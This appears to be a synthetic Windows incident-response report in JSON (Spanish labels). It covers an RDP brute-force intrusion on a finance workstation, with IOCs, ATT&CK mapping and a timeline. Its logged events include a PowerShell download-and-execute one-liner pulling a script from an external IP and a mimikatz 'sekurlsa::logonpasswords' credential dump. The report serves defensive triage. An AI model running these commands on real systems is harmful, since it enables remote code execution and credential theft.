@@ -1,0 +1,701 @@
+{
+  "case": {
+    "name": "IR-2026/07/15-WPRO-42",
+    "examiner": "C. Villalba",
+    "os": "Windows",
+    "description": "Estación de finanzas: acceso RDP desde IP externa, volcado de credenciales (mimikatz) y borrado del registro de seguridad.",
+    "generated_utc": ""
+  },
+  "host": {
+    "hostname": "CORP-FIN-07",
+    "os": "Windows 11 Pro (build 22631)",
+    "os_version": "#1 SMP PREEMPT_DYNAMIC @0",
+    "architecture": "x86_64",
+    "python": "3.12.3"
+  },
+  "generated_utc": "2026-07-15T07:04:35Z",
+  "assessment": {
+    "risk_score": 100,
+    "verdict_key": "critico",
+    "verdict": "Compromiso muy probable",
+    "verdict_color": "#F0616D",
+    "verdict_text": "Múltiples indicadores de alta confianza (p. ej. anti-forense, persistencia, credential access). Trata el equipo como comprometido: aíslalo y escala.",
+    "confidence": 94,
+    "confidence_tier": "alta",
+    "reasons": [
+      {
+        "label": "Borrado de registros de eventos",
+        "count": 1,
+        "points": 35,
+        "tactic": "Defense Evasion",
+        "attack": "T1070.001"
+      },
+      {
+        "label": "Volcado de credenciales (mimikatz/LSASS)",
+        "count": 1,
+        "points": 30,
+        "tactic": "Credential Access",
+        "attack": "T1003"
+      },
+      {
+        "label": "Fuerza bruta / accesos fallidos",
+        "count": 9,
+        "points": 20,
+        "tactic": "Credential Access",
+        "attack": "T1110"
+      },
+      {
+        "label": "Detección de antivirus (Defender)",
+        "count": 1,
+        "points": 20,
+        "tactic": "Execution",
+        "attack": "T1204"
+      },
+      {
+        "label": "Cuenta de usuario creada",
+        "count": 1,
+        "points": 15,
+        "tactic": "Persistence",
+        "attack": "T1136"
+      },
+      {
+        "label": "Servicio instalado (persistencia)",
+        "count": 1,
+        "points": 12,
+        "tactic": "Persistence",
+        "attack": "T1543.003"
+      },
+      {
+        "label": "PowerShell ofuscado/descarga",
+        "count": 1,
+        "points": 8,
+        "tactic": "Execution",
+        "attack": "T1059.001"
+      },
+      {
+        "label": "Descarga de herramienta/ejecutable",
+        "count": 1,
+        "points": 8,
+        "tactic": "Command and Control",
+        "attack": "T1105"
+      },
+      {
+        "label": "Conexión de red saliente sospechosa (C2)",
+        "count": 1,
+        "points": 8,
+        "tactic": "Command and Control",
+        "attack": "T1071"
+      }
+    ],
+    "attack_techniques": [
+      {
+        "attack": "T1059.001",
+        "tactic": "Execution",
+        "label": "PowerShell ofuscado/descarga",
+        "count": 1
+      },
+      {
+        "attack": "T1204",
+        "tactic": "Execution",
+        "label": "Detección de antivirus (Defender)",
+        "count": 1
+      },
+      {
+        "attack": "T1136",
+        "tactic": "Persistence",
+        "label": "Cuenta de usuario creada",
+        "count": 1
+      },
+      {
+        "attack": "T1543.003",
+        "tactic": "Persistence",
+        "label": "Servicio instalado (persistencia)",
+        "count": 1
+      },
+      {
+        "attack": "T1070.001",
+        "tactic": "Defense Evasion",
+        "label": "Borrado de registros de eventos",
+        "count": 1
+      },
+      {
+        "attack": "T1003",
+        "tactic": "Credential Access",
+        "label": "Volcado de credenciales (mimikatz/LSASS)",
+        "count": 1
+      },
+      {
+        "attack": "T1110",
+        "tactic": "Credential Access",
+        "label": "Fuerza bruta / accesos fallidos",
+        "count": 9
+      },
+      {
+        "attack": "T1071",
+        "tactic": "Command and Control",
+        "label": "Conexión de red saliente sospechosa (C2)",
+        "count": 1
+      },
+      {
+        "attack": "T1105",
+        "tactic": "Command and Control",
+        "label": "Descarga de herramienta/ejecutable",
+        "count": 1
+      }
+    ],
+    "signals_triggered": 9
+  },
+  "iocs": [
+    {
+      "type": "ipv4",
+      "value": "91.219.236.14",
+      "defanged": "91[.]219[.]236[.]14",
+      "count": 12,
+      "private": false,
+      "sources": [
+        "eventlogs"
+      ]
+    },
+    {
+      "type": "domain",
+      "value": "secure-docs-finance.top",
+      "defanged": "secure-docs-finance[.]top",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "browsers"
+      ]
+    },
+    {
+      "type": "sha1",
+      "value": "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
+      "defanged": "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "amcache"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://91.219.236.14/a.ps1",
+      "defanged": "hxxp://91[.]219[.]236[.]14/a[.]ps1",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "eventlogs"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://secure-docs-finance.top/invoice.exe",
+      "defanged": "hxxp://secure-docs-finance[.]top/invoice[.]exe",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "browsers"
+      ]
+    }
+  ],
+  "integrity": {
+    "artifacts_total": 4,
+    "artifacts_hashed": 3
+  },
+  "findings": [
+    {
+      "level": "crit",
+      "text": "1 evento(s) de borrado de registros — posible anti-forense"
+    },
+    {
+      "level": "crit",
+      "text": "1 detección(es) de Windows Defender"
+    },
+    {
+      "level": "warn",
+      "text": "9 inicio(s) de sesión fallido(s) (EID 4625)"
+    },
+    {
+      "level": "warn",
+      "text": "1 servicio(s) instalado(s) (EID 7045) — vector de persistencia"
+    },
+    {
+      "level": "warn",
+      "text": "1 bloque(s) de script de PowerShell registrados (EID 4104)"
+    },
+    {
+      "level": "warn",
+      "text": "1 cuenta(s) de usuario creada(s) (EID 4720)"
+    },
+    {
+      "level": "warn",
+      "text": "1 artefacto(s) no se pudieron adquirir (revisa la cadena de custodia)"
+    }
+  ],
+  "chain_of_custody": [
+    {
+      "category": "eventlogs",
+      "source": "C:\\...\\Security.evtx",
+      "collected_utc": "2026-07-14T03:30:00Z",
+      "status": "ok",
+      "artifact": "artifacts/eventlogs",
+      "method": "vss",
+      "size": 1048576,
+      "md5": "00000000000000000000000000000001",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+      "category": "amcache",
+      "source": "C:\\...\\Amcache.hve",
+      "collected_utc": "2026-07-14T03:30:00Z",
+      "status": "ok",
+      "artifact": "artifacts/amcache",
+      "method": "vss",
+      "size": 1048576,
+      "md5": "00000000000000000000000000000003",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000003"
+    },
+    {
+      "category": "registry",
+      "source": "C:\\...\\SECURITY",
+      "collected_utc": "2026-07-14T03:30:00Z",
+      "status": "failed",
+      "error": "bloqueado"
+    },
+    {
+      "category": "browsers",
+      "source": "C:\\...\\History",
+      "collected_utc": "2026-07-14T03:30:00Z",
+      "status": "ok",
+      "artifact": "artifacts/browsers",
+      "method": "vss",
+      "size": 1048576,
+      "md5": "00000000000000000000000000000006",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000006"
+    }
+  ],
+  "artifacts": {
+    "eventlogs": [
+      {
+        "timestamp": "2026-07-14T02:03:00Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:03:30Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:04:00Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:04:30Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:05:00Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:05:30Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:06:00Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:06:30Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:07:00Z",
+        "event_id": "4625",
+        "description": "Inicio de sesión fallido",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:09:00Z",
+        "event_id": "4624",
+        "description": "Inicio de sesión correcto",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "administrador",
+          "LogonType": "10",
+          "IpAddress": "91.219.236.14"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:18:00Z",
+        "event_id": "4104",
+        "description": "PowerShell: bloque de script ejecutado",
+        "channel": "PowerShell",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://91.219.236.14/a.ps1')"
+        },
+        "log_file": "PowerShell.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:22:00Z",
+        "event_id": "4688",
+        "description": "Creación de proceso",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "NewProcessName": "C:\\Users\\Public\\m.exe",
+          "CommandLine": "m.exe sekurlsa::logonpasswords",
+          "SubjectUserName": "administrador"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:25:00Z",
+        "event_id": "7045",
+        "description": "Servicio instalado en el sistema",
+        "channel": "System",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "ServiceName": "WinDefendHelper",
+          "ImagePath": "C:\\ProgramData\\svchost.exe"
+        },
+        "log_file": "System.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:28:00Z",
+        "event_id": "4720",
+        "description": "Cuenta de usuario creada",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "TargetUserName": "support$"
+        },
+        "log_file": "Security.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:36:00Z",
+        "event_id": "3",
+        "description": "Sysmon: conexión de red",
+        "channel": "Sysmon",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "Image": "C:\\ProgramData\\svchost.exe",
+          "DestinationIp": "91.219.236.14",
+          "DestinationPort": "443"
+        },
+        "log_file": "Sysmon.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T02:40:00Z",
+        "event_id": "1116",
+        "description": "Windows Defender: malware detectado",
+        "channel": "Windows Defender",
+        "computer": "CORP-FIN-07",
+        "details": {
+          "Threat Name": "HackTool:Win64/Mikatz",
+          "Path": "C:\\Users\\Public\\m.exe"
+        },
+        "log_file": "Windows Defender.evtx"
+      },
+      {
+        "timestamp": "2026-07-14T03:10:00Z",
+        "event_id": "1102",
+        "description": "Registro de auditoría de seguridad borrado",
+        "channel": "Security",
+        "computer": "CORP-FIN-07",
+        "details": {},
+        "log_file": "Security.evtx"
+      }
+    ],
+    "prefetch": [
+      {
+        "timestamp": "2026-07-14T02:35:00Z",
+        "executable": "M.EXE",
+        "run_count": 1,
+        "last_run": "2026-07-14T02:35:00Z",
+        "previous_runs": [],
+        "source_pf": "M.EXE-7F.pf"
+      }
+    ],
+    "amcache": [
+      {
+        "timestamp": "2026-07-14T02:34:00Z",
+        "path": "C:\\Users\\Public\\m.exe",
+        "sha1": "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
+        "publisher": "",
+        "product": "mimikatz",
+        "link_date": "",
+        "source": "InventoryApplicationFile"
+      }
+    ],
+    "shimcache": [
+      {
+        "timestamp": "2026-07-14T02:35:00Z",
+        "path": "C:\\Users\\Public\\m.exe",
+        "last_modified": "2026-07-14T02:35:00Z",
+        "order": 0
+      }
+    ],
+    "browsers": [
+      {
+        "timestamp": "2026-07-14T01:55:00Z",
+        "kind": "descarga",
+        "url": "http://secure-docs-finance.top/invoice.exe",
+        "title": "invoice.exe",
+        "source": "jgarcia_Default_History"
+      }
+    ]
+  },
+  "parse_errors": [],
+  "timeline_count": 21,
+  "timeline": [
+    {
+      "timestamp": "2026-07-14T03:10:00Z",
+      "source": "Evento",
+      "type": "EID 1102",
+      "summary": "Registro de auditoría de seguridad borrado",
+      "detail": "Security",
+      "severity": "crit"
+    },
+    {
+      "timestamp": "2026-07-14T02:40:00Z",
+      "source": "Evento",
+      "type": "EID 1116",
+      "summary": "Windows Defender: malware detectado",
+      "detail": "Threat Name=HackTool:Win64/Mikatz · Path=C:\\Users\\Public\\m.exe",
+      "severity": "crit"
+    },
+    {
+      "timestamp": "2026-07-14T02:36:00Z",
+      "source": "Evento",
+      "type": "EID 3",
+      "summary": "Sysmon: conexión de red",
+      "detail": "Image=C:\\ProgramData\\svchost.exe · DestinationIp=91.219.236.14 · DestinationPort=443",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:35:00Z",
+      "source": "Prefetch",
+      "type": "Ejecución",
+      "summary": "M.EXE (x1)",
+      "detail": "M.EXE-7F.pf",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:35:00Z",
+      "source": "Shimcache",
+      "type": "Presencia",
+      "summary": "C:\\Users\\Public\\m.exe",
+      "detail": "orden #0",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:34:00Z",
+      "source": "Amcache",
+      "type": "Programa",
+      "summary": "C:\\Users\\Public\\m.exe",
+      "detail": "SHA1 a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:28:00Z",
+      "source": "Evento",
+      "type": "EID 4720",
+      "summary": "Cuenta de usuario creada",
+      "detail": "TargetUserName=support$",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:25:00Z",
+      "source": "Evento",
+      "type": "EID 7045",
+      "summary": "Servicio instalado en el sistema",
+      "detail": "ServiceName=WinDefendHelper · ImagePath=C:\\ProgramData\\svchost.exe",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:22:00Z",
+      "source": "Evento",
+      "type": "EID 4688",
+      "summary": "Creación de proceso",
+      "detail": "NewProcessName=C:\\Users\\Public\\m.exe · CommandLine=m.exe sekurlsa::logonpasswords · SubjectUserName=administrador",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:18:00Z",
+      "source": "Evento",
+      "type": "EID 4104",
+      "summary": "PowerShell: bloque de script ejecutado",
+      "detail": "ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://91.219.236.14/a.ps1')",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:09:00Z",
+      "source": "Evento",
+      "type": "EID 4624",
+      "summary": "Inicio de sesión correcto",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:07:00Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:06:30Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:06:00Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:05:30Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:05:00Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:04:30Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:04:00Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:03:30Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:03:00Z",
+      "source": "Evento",
+      "type": "EID 4625",
+      "summary": "Inicio de sesión fallido",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T01:55:00Z",
+      "source": "Navegador",
+      "type": "descarga",
+      "summary": "http://secure-docs-finance.top/invoice.exe",
+      "detail": "invoice.exe",
+      "severity": "info"
+    }
+  ]
+}
